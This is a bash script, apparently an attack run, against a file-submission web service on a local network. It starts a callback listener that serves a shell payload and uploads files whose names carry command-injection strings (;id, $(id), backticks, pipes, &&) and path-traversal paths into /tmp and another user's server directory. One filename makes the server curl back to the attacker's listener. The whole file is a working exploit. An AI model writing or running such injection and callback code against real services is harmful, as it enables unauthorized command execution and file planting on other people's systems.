#!/bin/bash
set +e
D=/dev/shm/ul5685/inj; mkdir -p $D
B=http://192.168.0.24:18086
HOSTIP=$(ip -4 -o addr show | awk '{print $4}' | cut -d/ -f1 | grep '^192\.168\.0\.' | head -1)
echo "HOSTIP=$HOSTIP"
echo "=== submit.py full"
sed -n 1,200p /dev/shm/ul5685/ctr/submit.py 2>/dev/null || timeout 8 curl -s -m 6 "$B/downloads/submit.py"
echo "=== start listener 8899"
cd $D
cat > srv.py <<'PY'
import http.server,socketserver,datetime,sys
class H(http.server.SimpleHTTPRequestHandler):
    def log_message(self,*a): pass
    def do_GET(self):
        line="%s %s %s UA=%s\n"%(datetime.datetime.utcnow().isoformat(),self.client_address[0],self.path,self.headers.get('User-Agent'))
        open('/dev/shm/ul5685/inj/hits.log','a').write(line)
        body=b"#!/bin/sh\necho PLANT_OK_5685 $(id -un) $(hostname) > /dev/shm/plant5685.txt\nid; hostname; uname -a; nvidia-smi -L\n"
        self.send_response(200); self.send_header('Content-Type','text/plain'); self.send_header('Content-Length',str(len(body))); self.end_headers(); self.wfile.write(body)
    do_POST=do_GET
socketserver.TCPServer.allow_reuse_address=True
socketserver.TCPServer(('0.0.0.0',8899),H).serve_forever()
PY
setsid nohup python3 srv.py >/dev/null 2>&1 &
sleep 2
curl -s -m 3 "http://127.0.0.1:8899/selftest" >/dev/null; echo "listener hits:"; cat hits.log 2>/dev/null

mk() { # model
  timeout 10 curl -s -m 8 -X POST -H 'Content-Type: application/json' -d "{\"model\":\"$1\",\"nickname\":\"ul-t2-123-184-7-135\",\"description\":\"inj\",\"contexts\":[\"H\"]}" "$B/api/submissions"
}
up() { # sid tok fn bodyfile
  timeout 15 curl -s -m 12 -X PUT -H "X-Edit-Token: $2" -H "X-Filename: $(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$3")" -H 'Content-Type: application/octet-stream' --data-binary @"$4" "$B/api/submissions/$1/files/H" -w "  HTTP %{http_code}\n"
}
cm() { timeout 20 curl -s -m 18 -X POST -H "X-Edit-Token: $2" -H 'Content-Type: application/json' -d '{}' "$B/api/submissions/$1/commit" -w "  HTTP %{http_code}\n" | head -c 600; echo; }

printf 'x' > $D/b.bin
run() { # tag filename
  local tag="$1" fn="$2"
  local R=$(mk "ul$tag-5685")
  local SID=$(echo "$R"|python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
  local T=$(echo "$R"|python3 -c 'import sys,json;print(json.load(sys.stdin)["edit_token"])')
  echo "### $tag SID=$SID fn=$fn"
  up "$SID" "$T" "$fn" "$D/b.bin"
  timeout 10 curl -s -m 8 "$B/api/submissions/$SID" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("   files=",json.dumps(d.get("files")))' 2>/dev/null
  cm "$SID" "$T"
  sleep 2
  timeout 10 curl -s -m 8 "$B/api/submissions/$SID" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("   status=",d.get("status"),"err=",d.get("error"),"result=",str(d.get("result"))[:300])' 2>/dev/null
}
run ok "ulok.h5ad"
run semi "ul;id.h5ad"
run dollar "ul\$(id).h5ad"
run tick "ul\`id\`.h5ad"
run pipe "ul|id.h5ad"
run amp "ul&&id.h5ad"
run trav "../../../../../../../../tmp/ul5685t.h5ad"
run trav2 "../../../../../../../ssd2/liuqi/vcc-web10.11/server_data/ul5685t2.h5ad"
run cb "ul;curl -s http://$HOSTIP:8899/cb-fn;.h5ad"

echo "=== HITS"; cat $D/hits.log 2>/dev/null; echo "=== END HITS"
echo DONE
